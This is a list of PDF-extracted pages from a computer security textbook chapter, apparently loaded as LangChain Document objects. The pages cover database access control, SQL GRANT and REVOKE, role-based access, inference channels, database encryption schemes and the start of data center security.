granted access to the database, a database access con -\\ntrol system provides a specific capability that controls access to portions of the \\ndatabase.\\nCommercial and open-source DBMSs provide discretionary or role-based \\naccess control. We defer a discussion of mandatory access control considerations to \\nChapter 27 . Typically, a DBMS can support a range of administrative policies, includ-\\ning the following:\\n• Centralized administration: A small number of privileged users may grant and \\nrevoke access rights.\\n• Ownership-based administration: The owner (creator) of a table may grant and \\nrevoke access rights to the table.\\n• Decentralized administration:  In addition to gr anting and revoking access \\nrights to a table, the owner of the table may grant and revoke authorization \\nrights to other users, allowing them to grant and revoke access rights to the \\ntable.\\nAs with any access control system, a database access control system distin -\\nguishes different access rights, including create, insert, delete, update, read, and write. \\nSome DBMSs provide considerable control over the granularity of access rights. \\nAccess rights can be to the entire database, to individual tables, or to selected rows \\nor columns within a table. Access rights can be determined based on the contents \\nof a table entry. For example, in a personnel database, some users may be limited to \\nseeing salary information only up to a certain maximum value. And a department \\nmanager may only be allowed to view salary information for employees in his or her \\ndepartment.\\nM05_STAL0611_04_GE_C05.indd   183 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 185, 'page_label': '184'}, page_content='184  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nSQL-Based Access Definition\\nSQL provides two commands for managing access rights, GRANT and REVOKE. \\nFor different versions of SQL, the syntax is slightly different. In general terms, the \\nGRANT command has the following syntax:1\\nGRANT 5privileges /H20841 role6\\n[ON table]\\nTO 5user /H20841 role /H20841 PUBLIC6\\n[IDENTIFIED BY password]\\n[WITH GRANT OPTION]\\nThis command can be used to grant one or more access rights or can be used \\nto assign a user to a role. For access rights, the command can optionally specify that it \\napplies only to a specified table. The TO clause specifies the user or role to which the \\nrights are granted. A PUBLIC value indicates that any user has the specified access rights. \\nThe optional IDENTIFIED BY clause specifies a password that must be used to revoke \\nthe access rights of this GRANT command. The GRANT OPTION indicates that the \\ngrantee can grant this access right to other users, with or without the grant option.\\nAs a simple example, consider the following statement:\\nGRANT SELECT ON ANY TABLE TO ricflair\\nThis statement enables the user ricflair to query any table in the database.\\nDifferent implementations of SQL provide different ranges of access rights. The \\nfollowing is a typical list:\\n• Select: Grantee may read entire database; individual tables; or specific columns \\nin a table.\\n• Insert: Grantee may insert rows in a table; or insert rows with values for specific \\ncolumns in a table.\\n• Update: Semantics is similar to INSERT.\\n• Delete: Grantee may delete rows from a table.\\n• References: Grantee is allowed to define foreign keys in another table that refer \\nto the specified columns.\\nThe REVOKE command has the following syntax:\\nREVOKE 5privileges /H20841 role6\\n[ON table]\\nFROM 5user /H20841 role /H20841 PUBLIC6\\n1The following syntax definition conventions are used. Elements separated by a vertical line are alterna-\\ntives. A list of alternatives is grouped in curly brackets. Square brackets enclose optional elements. That is, \\nthe elements inside the square brackets may or may not be present.\\nM05_STAL0611_04_GE_C05.indd   184 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 186, 'page_label': '185'}, page_content='5.5 / DATAbASE ACCESS COnTROL  185\\nThus, the following statement revokes the access rights of the preceding example:\\nREVOKE SELECT ON ANY TABLE FROM ricflair\\nCascading Authorizations\\nThe grant option enables an access right to cascade through a number of users. We \\nconsider a specific access right and illustrate the cascade phenomenon in Figure 5.6. \\nThe figure indicates that Ann grants the access right to Bob at time t = 10 and to \\nChris at time t = 20. Assume the grant option is always used. Thus, Bob is able to \\ngrant the access right to David at t = 30. Chris redundantly grants the access right \\nto David at t = 50. Meanwhile, David grants the right to Ellen, who in turn grants it \\nto Jim; and subsequently David grants the right to Frank.\\nJust as the granting of privileges cascades from one user to another using the \\ngrant option, the revocation of privileges also cascaded. Thus, if Ann revokes the \\naccess right to Bob and Chris, then the access right is also revoked to David, Ellen, \\nJim, and Frank. A complication arises when a user receives the same access right \\nmultiple times, as happens in the case of David. Suppose Bob revokes the privilege \\nfrom David. David still has the access right because it was granted by Chris at t = 50. \\nHowever, David granted the access right to Ellen after receiving the right, with grant \\noption, from Bob but prior to receiving it from Chris. Most implementations dic -\\ntate that in this circumstance, the access right to Ellen and therefore Jim is revoked \\nwhen Bob revokes the access right to David. This is because at t = 40, when David \\ngranted the access right to Ellen, David only had the grant option to do this from \\nBob. When Bob revokes the right, this causes all subsequent cascaded grants that are \\ntraceable solely to Bob via David to be revoked. Because David granted the access \\nright to Frank after David was granted the access right with grant option from Chris, \\nthe access right to Frank remains. These effects are shown in the lower portion of \\nFigure\\xa05.6.\\nFigure 5.6 Bob Revokes Privilege from David\\nAnn\\nBob\\nChris\\nDavid Frank\\nEllen Jim\\nt = 70\\nt = 60t = 40\\nt = 30\\nt = 50\\nt = 10\\nt = 20\\nAnn\\nBob\\nChris\\nDavid Frank\\nt = 60\\nt = 50\\nt = 10\\nt = 20\\nM05_STAL0611_04_GE_C05.indd   185 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 187, 'page_label': '186'}, page_content='186  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nTo generalize, the convention followed by most implementations is as follows. \\nWhen user A revokes an access right, any cascaded access right is also revoked, unless \\nthat access right would exist even if the original grant from A had never occurred. \\nThis convention was first proposed in [GRIF76].\\nRole-Based Access Control\\nA role-based access control (RBAC) scheme is a natural fit for database access con-\\ntrol. Unlike a file system associated with a single or a few applications, a database \\nsystem often supports dozens of applications. In such an environment, an individual \\nuser may use a variety of applications to perform a variety of tasks, each of which \\nrequires its own set of privileges. It would be poor administrative practice to simply \\ngrant users all of the access rights they require for all the tasks they perform. RBAC \\nprovides a means of easing the administrative burden and improving security.\\nIn a discretionary access control environment, we can classify database users \\nin to three broad categories:\\n• Application owner: An end user who owns database objects (tables, columns, \\nand rows) as part of an application. That is, the database objects are generated \\nby the application or are prepared for use by the application.\\n• End user other than applic ation owner:  An end user who operates on data -\\nbase objects via a particular application but does not own any of the database \\nobjects.\\n• Administrator: User who has administrative responsibility for part or all of the \\ndatabase.\\nWe can make some general statements about RBAC concerning these three \\ntypes of users. An application has associated with it a number of tasks, with each \\ntask requiring specific access rights to portions of the database. For each task, one \\nor more roles can be defined that specify the needed access rights. The application \\nowner may assign roles to end users. Administrators are responsible for more sensi-\\ntive or general roles, including those having to do with managing physical and logical \\ndatabase components, such as data files, users, and security mechanisms. The system \\nneeds to be set up to give certain administrators certain privileges. Administrators in \\nturn can assign users to administrative-related roles.\\nA database RBAC facility needs to provide the following capabilities:\\n• Create and delete roles.\\n• Define permissions for a role.\\n• Assign and cancel assignment of users to roles.\\nA good example of the use of roles in database security is the RBAC facility \\nprovided by Microsoft SQL Server. SQL Server supports three types of roles: Server \\nroles, database roles, and user-defined roles. The first two types of roles are referred \\nto as fixed roles (see Table 5.2); these are preconfigured for a system with specific \\naccess rights. The administrator or user cannot add, delete, or modify fixed roles; it is \\nonly possible to add and remove users as members of a fixed role.\\nFixed server roles  are defined at the server level and exist independently of \\nany user database. They are designed to ease the administrative task. These roles \\nM05_STAL0611_04_GE_C05.indd   186 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 188, 'page_label': '187'}, page_content='5.5 / DATAbASE ACCESS COnTROL  187\\nhave different permissions and are intended to provide the ability to spread the \\nadministrative responsibilities without having to give out complete control. Database \\nadministrators can use these fixed server roles to assign different administrative tasks \\nto personnel and give them only the rights they absolutely need.\\nFixed database roles  operate at the level of an individual database. As with \\nfixed server roles, some of the fixed database roles, such as db_accessadmin and db_\\nsecurityadmin, are designed to assist a DBA with delegating administrative respon-\\nsibilities. Others, such as db_datareader and db_datawriter, are designed to provide \\nblanket permissions for an end user.\\nSQL Server allows users to create roles. These user-defined roles can then be \\nassigned access rights to portions of the database. A user with proper authorization \\n(typically, a user assigned to the db_securityadmin role) may define a new role and \\nassociate access rights with the role. There are two types of user-defined roles: Stan-\\ndard and application. For a standard role, an authorized user can assign other users \\nto the role. An application role is associated with an application rather than with a \\ngroup of users and requires a password. The role is activated when an application \\nexecutes the appropriate code. A user who has access to the application can use the \\napplication role for database access. Often, database applications enforce their own \\nsecurity based on the application logic. For example, you can use an application role \\nRole Permissions\\nFixed Server Roles\\nsysadmin Can perform any activity in SQL Server and have complete control over all \\ndatabase functions\\nserveradmin Can set server-wide configuration options and shut down the server\\nsetupadmin Can manage linked servers and startup procedures\\nsecurityadmin Can manage logins and CREATE DATABASE permissions, also read error \\nlogs and change passwords\\nprocessadmin Can manage processes running in SQL Server\\nDbcreator Can create, alter, and drop databases\\ndiskadmin Can manage disk files\\nbulkadmin Can execute BULK INSERT statements\\nFixed Database Roles\\ndb_owner Has all permissions in the database\\ndb_accessadmin Can add or remove user IDs\\ndb_datareader Can select all data from any user table in the database\\ndb_datawriter Can modify any data in any user table in the database\\ndb_ddladmin Can issue all data definition language statements\\ndb_securityadmin Can manage all permissions, object ownerships, roles and role memberships\\ndb_backupoperator Can issue DBCC, CHECKPOINT, and BACKUP statements\\ndb_denydatareader Can deny permission to select data in the database\\ndb_denydatawriter Can deny permission to change data in the database\\nTable 5.2 Fixed Roles in Microsoft SQL Server\\nM05_STAL0611_04_GE_C05.indd   187 10/11/17   2:49 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 189, 'page_label': '188'}, page_content='188  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nwith its own password to allow the particular user to obtain and modify any data \\nonly during specific hours. Thus, you can realize more complex security management \\nwithin the application logic.\\n 5.6 INFERENCE\\nInference, as it relates to database security, is the process of performing authorized \\nqueries and deducing unauthorized information from the legitimate responses \\nreceived. The inference problem arises when the combination of a number of data \\nitems is more sensitive than the individual items, or when a combination of data items \\ncan be used to infer data of higher sensitivity. Figure 5.7 illustrates the process. The \\nattacker may make use of nonsensitive data as well as metadata. Metadata refers to \\nknowledge about correlations or dependencies among data items that can be used to \\ndeduce information not otherwise available to a particular user. The information trans-\\nfer path by which unauthorized data is obtained is referred to as an inference channel.\\nIn general terms, two inference techniques can be used to derive additional \\ninformation: Analyzing functional dependencies between attributes within a table \\nor across tables, and merging views with the same constraints.\\nAn example of the latter, shown in Figure 5.8, illustrates the inference prob -\\nlem. Figure 5.8a shows an Inventory table with four columns. Figure 5.8b shows two \\nviews, defined in SQL as follows:\\nCREATE view V1 AS CREATE view V2 AS\\nSELECT Availability, Cost SELECT Item, Department\\nFROM Inventory FROM Inventory\\nWHERE Department = “hardware” WHERE Department = “hardware”\\nFigure 5.7 Indirect Information Access via Inference Channel\\nSensitive\\ndata\\nMetadata\\nAuthorized\\naccess Unauthorized\\naccess\\nInference\\nAccess control\\nNon\\nsensitive\\ndata\\nM05_STAL0611_04_GE_C05.indd   188 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 190, 'page_label': '189'}, page_content='5.6 / inFEREnCE  189\\nUsers of these views are not authorized to access the relationship between Item \\nand Cost. A user who has access to either or both views cannot infer the relationship \\nby functional dependencies. That is, there is not a functional relationship between \\nItem and Cost such that knowing Item and perhaps other information is sufficient to \\ndeduce Cost. However, suppose the two views are created with the access constraint \\nthat Item and Cost cannot be accessed together. A user who knows the structure \\nof the Inventory table and who knows that the view tables maintain the same row \\norder as the Inventory table is then able to merge the two views to construct the table \\nshown in Figure 5.8c. This violates the access control policy that the relationship of \\nattributes Item and Cost must not be disclosed.\\nIn general terms, there are two approaches to dealing with the threat of disclo-\\nsure by inference:\\n• Inference detection during data base design: This approach removes an infer-\\nence channel by altering the database structure or by changing the access con-\\ntrol regime to prevent inference. Examples include removing data dependencies \\nby splitting a table into multiple tables or using more fine-grained access control \\nroles in an RBAC scheme. Techniques in this category often result in unneces-\\nsarily stricter access controls that reduce availability.\\n• Inference detection at query time:  This approach seeks to eliminate an infer -\\nence channel violation during a query or series of queries. If an inference chan-\\nnel is detected, the query is denied or altered.\\nFigure 5.8 Inference Example\\nAvailabilityItem Cost ($) Department\\nRolling pin\\nShower/tub cleaner\\nCake pan\\nDecorative chain\\nLid support\\nShelf support in-store/online hardware\\nhardware\\nhardware\\nhousewares\\nhousewares\\nhousewares\\n7.99\\n5.49\\n104.99\\n12.99\\n11.99\\n10.99\\nin-store/online\\nin-store/online\\nin-store/online\\nonline only\\nonline only\\n(a) Inventory table\\nDepartmentItem\\nDecorative chain\\nLid support\\nShelf support hardware\\nhardware\\nhardware\\nAvailability Cost ($)\\nin-store/online 7.99\\n5.49\\n104.99in-store/online\\nonline only\\n(b) Two views\\nDepartmentItem\\nDecorative chain\\nLid support\\nShelf support hardware\\nhardware\\nhardware\\nAvailability Cost ($)\\nin-store/online 7.99\\n5.49\\n104.99in-store/online\\nonline only\\n(c) Table derived from combining query answers\\nM05_STAL0611_04_GE_C05.indd   189 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 191, 'page_label': '190'}, page_content='190  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nFor either of the preceding approaches, some inference detection algorithm is \\nneeded. This is a difficult problem and the subject of ongoing research. To give some \\nappreciation of the difficulty, we present an example taken from [LUNT89]. Consider \\na database containing personnel information, including names, addresses, and salaries \\nof employees. Individually, the name, address, and salary information is available to a \\nsubordinate role, such as Clerk, but the association of names and salaries is restricted \\nto a superior role, such as Administrator. This is similar to the problem illustrated in \\nFigure 5.8. One solution to this problem is to construct three tables, which include \\nthe following information:\\nEmployees (Emp#, Name, Address)\\nSalaries (S#, Salary)\\nEmp-Salary (Emp#, S#)\\nwhere each line consists of the table name followed by a list of column names for that table. \\nIn this case, each employee is assigned a unique employee number (Emp#) and a unique \\nsalary number (S#). The Employees table and the Salaries table are accessible to the Clerk \\nrole, but the Emp-Salary table is only available to the Administrator role. In this structure, \\nthe sensitive relationship between employees and salaries is protected from users assigned \\nthe Clerk role. Now, suppose we want to add a new attribute, employee\\xa0start date, which \\nis not sensitive. This could be added to the Salaries table as follows:\\nEmployees (Emp#, Name, Address)\\nSalaries (S#, Salary, Start-Date)\\nEmp-Salary (Emp#, S#)\\nHowever, an employee’s start date is an easily observable or discoverable attri-\\nbute of an employee. Thus, a user in the Clerk role should be able to infer (or par -\\ntially infer) the employee’s name. This would compromise the relationship between \\nemployee and salary. A straightforward way to remove the inference channel is to \\nadd the start-date column to the Employees table rather than to the Salaries table.\\nThe first security problem indicated in this sample, that it was possible to infer the \\nrelationship between employee and salary, can be detected through analysis of the data \\nstructures and security constraints that are available to the DBMS. However, the sec-\\nond security problem, in which the start-date column was added to the Salaries table, \\ncannot be detected using only the information stored in the database. In particular, the \\ndatabase does not indicate that the employee name can be inferred from the start date.\\nIn the general case of a relational database, inference detection is a complex \\nand difficult problem. For multilevel secure databases, to be discussed in Chapter 27 , \\nand statistical databases, to be discussed in the next section, progress has been made \\nin devising specific inference detection techniques.\\n 5.7 DATABASE ENCRYPTION\\nThe database is typically the most valuable information resource for any organi -\\nzation and is therefore protected by multiple layers of security, including firewalls, \\nauthentication mechanisms, general access control systems, and database access \\nM05_STAL0611_04_GE_C05.indd   190 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 192, 'page_label': '191'}, page_content='5.7 / DATAbASE EnCRyPTiOn  191\\ncontrol systems. In addition, for particularly sensitive data, database encryption is \\nwarranted and often implemented. Encryption becomes the last line of defense in \\ndatabase security.\\nThere are two disadvantages to database encryption:\\n• Key management:  Authorized users must have access to the decryption key \\nfor the data for which they have access. Because a database is typically acces -\\nsible to a wide range of users and a number of applications, providing secure \\nkeys to selected parts of the database to authorized users and applications is a \\ncomplex task.\\n• Inflexibility: When part or all of the database is encrypted, it becomes more \\ndifficult to perform record searching.\\nEncryption can be applied to the entire database, at the record level (encrypt \\nselected records), at the attribute level (encrypt selected columns), or at the level of \\nthe individual field.\\nA number of approaches have been taken to database encryption. In this \\n section, we look at a representative approach for a multiuser database.\\nA DBMS is a complex collection of hardware and software. It requires a large \\nstorage capacity and requires skilled personnel to perform maintenance, disaster \\nprotection, update, and security. For many small and medium-sized organizations, an \\nattractive solution is to outsource the DBMS and the database to a service provider. \\nThe service provider maintains the database off-site and can provide high availability, \\ndisaster prevention, and efficient access and update. The main concern with such a \\nsolution is the confidentiality of the data.\\nA straightforward solution to the security problem in this context is to encrypt the \\nentire database and not provide the encryption/decryption keys to the service provider. \\nThis solution by itself is inflexible. The user has little ability to access individual data \\nitems based on searches or indexing on key parameters, but rather would have to down-\\nload entire tables from the database, decrypt the tables, and work with the results. To pro-\\nvide more flexibility, it must be possible to work with the database in its encrypted form.\\nAn example of such an approach, depicted in Figure 5.9, is reported in [DAMI05] \\nand [DAMI03]. A similar approach is described in [HACI02]. Four entities are \\ninvolved:\\n• Data owner: An organization that produces data to be made available for con-\\ntrolled release, either within the organization or to external users.\\n• User: Human entity that presents requests (queries) to the system. The user \\ncould be an employee of the organization who is granted access to the database \\nvia the server, or a user external to the organization who, after authentication, \\nis granted access.\\n• Client: Front end that transforms user queries into queries on the encrypted \\ndata stored on the server.\\n• Server: An organization that receives the encrypted data from a data owner \\nand makes them available for distribution to clients. The server could in fact be \\nowned by the data owner but, more typically, is a facility owned and maintained \\nby an external provider.\\nM05_STAL0611_04_GE_C05.indd   191 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 193, 'page_label': '192'}, page_content='192  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nLet us first examine the simplest possible arrangement based on this scenario. \\nSuppose each individual item in the database is encrypted separately, all using the \\nsame encryption key. The encrypted database is stored at the server, but the server \\ndoes not have the key, so the data are secure at the server. Even if someone were \\nable to hack into the server’s system, all he or she would have access to is encrypted \\ndata. The client system does have a copy of the encryption key. A user at the client \\ncan retrieve a record from the database with the following sequence:\\n1. The user issues an SQL query for fields from one or more records with a specific \\nvalue of the primary key.\\n2. The query processor at the client encrypts the primary key, modifies the SQL \\nquery accordingly, and transmits the query to the server.\\n3. The server processes the query using the encrypted value of the primary key and \\nreturns the appropriate record or records.\\n4. The query processor decrypts the data and returns the results.\\nFor example, consider this query, which was introduced in Section 5.1, on the \\ndatabase of Figure 5.4a:\\nSELECT Ename, Eid, Ephone\\n    FROM Employee\\n    WHERE Did = 15\\nAssume the encryption key k is used and the encrypted value of the department \\nid 15 is E(k, 15) = 1000110111001110. Then, the query processor at the client could \\ntransform the preceding query into\\nFigure 5.9 A Database Encryption Scheme\\nQuery\\nprocessor\\n1. Original query\\nmetadata\\n4. Plaintext\\nresult\\n2. Transformed\\nquery\\n3. Encrypted\\nresult\\nClient\\nUser\\nData owner\\nServer\\nEncrypt/\\ndecrypt\\nQuery\\nexecutor\\nMeta-\\ndata\\nMeta-\\ndata\\nEncrypted\\ndatabase\\nData-\\nbase\\nM05_STAL0611_04_GE_C05.indd   192 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 194, 'page_label': '193'}, page_content='5.7 / DATAbASE EnCRyPTiOn  193\\nSELECT Ename, Eid, Ephone\\n    FROM Employee\\n    WHERE Did = 1000110111001110\\nThis method is certainly straightforward but, as was mentioned, lacks flexibility. \\nFor example, suppose the Employee table contains a salary attribute and the user \\nwishes to retrieve all records for salaries less than $70K. There is no obvious way to \\ndo this, because the attribute value for salary in each record is encrypted. The set \\nof encrypted values do not preserve the ordering of values in the original attribute.\\nTo provide more flexibility, the following approach is taken. Each record (row) \\nof a table in the database is encrypted as a block. Referring to the abstract model \\nof a relational database in Figure 5.3, each row Ri is treated as a contiguous block \\nBi = (xi1 }xi2 }c} xiM). Thus, each attribute value in Ri, regardless of whether it \\nis text or numeric, is treated as a sequence of bits, and all of the attribute values \\nfor that row are concatenated together to form a single binary block. The entire \\nrow is encrypted, expressed as E(k, Bi) = E(k, (xi1 }xi2 }c} xiM)). To assist in data \\nretrieval, attribute indexes are associated with each table. For some or all of the \\nattributes an index value is created. For each row Ri of the unencrypted database, the \\nmapping is as follows (see Figure 5.10):\\n(xi1, xi2, c , xiM) S [E(k, Bi), Ii1, Ii2, c , IiM]\\nFor each row in the original database, there is one row in the encrypted data -\\nbase. The index values are provided to assist in data retrieval. We can proceed as \\nfollows. For any attribute, the range of attribute values is divided into a set of non-\\noverlapping partitions that encompass all possible values, and an index value is \\nassigned to each partition.\\nTable 5.3 provides an example of this mapping. Suppose employee ID ( eid) \\nvalues lie in the range [1, 1000]. We can divide these values into five partitions:  \\n[1, 200], [201, 400], [401, 600], [601, 800], and [801, 1000]; then assign index values 1, \\n2, 3, 4, and 5, respectively. For a text field, we can derive an index from the first letter \\nof the attribute value. For the attribute ename, let us assign index 1 to values starting \\nwith A or B, index 2 to values starting with C or D, and so on. Similar partitioning \\nschemes can be used for each of the attributes. Table 5.3b shows the resulting table. \\nThe values in the first column represent the encrypted values for each row. The actual \\nvalues depend on the encryption algorithm and the encryption key. The remaining \\nFigure 5.10 Encryption Scheme for Database of Figure 5.3\\nE (k, B 1 )\\nE (k, B i)\\nE (k, B N )\\nI1 I\\nIi1\\nIN 1\\nI1 j\\nIij\\nINj\\nI1 M\\nIiM\\nINM\\nB i = (xi1  || xi2  || ... || xiM )\\nM05_STAL0611_04_GE_C05.indd   193 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 195, 'page_label': '194'}, page_content='194  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\ncolumns show index values for the corresponding attribute values. The mapping func-\\ntions between attribute values and index values constitute metadata that are stored \\nat the client and data owner locations but not at the server.\\nThis arrangement provides for more efficient data retrieval. Suppose, for \\n example, a user requests records for all employees with eid 6 300. The query proces-\\nsor requests all records with I(eid) = 2. These are returned by the server. The query \\nprocessor decrypts all rows returned, discards those that do not match the original \\nquery, and returns the requested unencrypted data to the user.\\nThe indexing scheme just described does provide a certain amount of informa-\\ntion to an attacker, namely a rough relative ordering of rows by a given attribute. To \\nobscure such information, the ordering of indexes can be randomized. For exam -\\nple, the eid values could be partitioned by mapping [1, 200], [201, 400], [401, 600], \\n[601,\\xa0800], and [801, 1000] into 2, 3, 5, 1, and 4, respectively. Because the metadata are \\nnot stored at the server, an attacker could not gain this information from the server.\\nOther features may be added to this scheme. To increase the efficiency of access-\\ning records by means of the primary key, the system could use the encrypted value of \\nthe primary key attribute values, or a hash value. In either case, the row corresponding \\nto the primary key value could be retrieved individually. Different portions of the \\ndatabase could be encrypted with different keys, so users would only have access to \\nthat portion of the database for which they had the decryption key. This latter scheme \\ncould be incorporated into a role-based access control system.\\n 5.8 DATA CENTER SECURITY\\nA data center is an enterprise facility that houses a large number of servers, storage \\ndevices, and network switches and equipment. The number of servers and storage \\ndevices can run into the tens of thousands in a single facility. Examples of uses for \\nTable 5.3 Encrypted Database Example\\n(a) Employee Table\\neid ename salary addr did\\n 23 Tom 70K Maple 45\\n860 Mary 60K Main 83\\n320 John 50K River 50\\n875 Jerry 55K Hopewell 92\\n(b) Encrypted Employee Table with Indexes\\nE(k, B) I(eid) I(ename) I(salary) I(addr) I(did)\\n1100110011001011\\xa0.\\xa0.\\xa0.\\xa0 1 10 3 7 4\\n0111000111001010\\xa0.\\xa0.\\xa0.\\xa0 5  7 2 7 8\\n1100010010001101\\xa0.\\xa0.\\xa0.\\xa0 2  5 1 9 5\\n0011010011111101\\xa0.\\xa0.\\xa0.\\xa0 5  5 2 4 9\\nM05_STAL0611_04_GE_C05.indd   194 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 196, 'page_label': '195'}, page_content='5.8 / DATA CEnTER SECuRiTy  195\\nthese large data centers include cloud service providers, search engines, large scien-\\ntific research facilities, and IT facilities for large enterprises. A data center generally \\nincludes redundant or backup power supplies, redundant network connections, envi-\\nronmental controls (e.g., air conditioning and fire suppression), and various security \\ndevices. Large data centers are industrial scale operations using as much electricity \\nas a small town. A data center can occupy one room of a building, one or more floors, \\nor an entire building.\\nData Center Elements\\nFigure 5.11 illustrates key elements of a large data center configuration. Most of the \\nequipment in a large data center is in the form of stacks of servers and storage mod-\\nules mounted in open racks or closed cabinets, which are usually placed in single rows \\nforming corridors between them. This allows access to the front and rear of each rack \\nor cabinet. Typically, the individual modules are equipped with 10-Gbps or 40-Gbps \\nEthernet ports to handle the massive traffic to and from these servers. Also typically, \\neach rack has one or two 10, 40 or 100-Gbps Ethernet switches to interconnect all \\nthe servers and provide connectivity to the rest of the facility. The switches are often \\nFigure 5.11 Key Data Center Elements\\nN * 100GbE\\n100GbE\\n10GbE\\n&\\n40GbE\\nEth Switch\\nEth Switch Eth Switch\\nEth Switch\\nAdditional racks\\nServer or\\nstorage rack\\nServer or\\nstorage rack\\nServer or\\nstorage rack\\nRouter/\\nFirewall\\nRouter/\\nFirewall\\nEth Switch Eth Switch\\nInternet or\\nenterprise\\nnetwork\\nInternet or\\nenterprise\\nnetwork\\nM05_STAL0611_04_GE_C05.indd   195 10/11/17   2:49 PM'),\n",
